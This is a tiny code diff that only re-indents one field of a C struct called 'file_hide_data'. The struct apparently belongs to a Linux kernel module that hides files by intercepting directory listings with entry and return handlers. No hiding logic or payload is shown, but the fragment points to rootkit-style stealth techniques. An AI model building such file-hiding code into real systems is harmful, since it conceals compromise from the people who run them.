@@ -32,7 +32,7 @@
 /* ─── Per-instance data passed from entry to return handler ───────────────── */
 
 struct file_hide_data {
-	struct linux_dirent64 __user *dirp;
+  struct linux_dirent64 __user *dirp;
   unsigned int fd;
 };
 
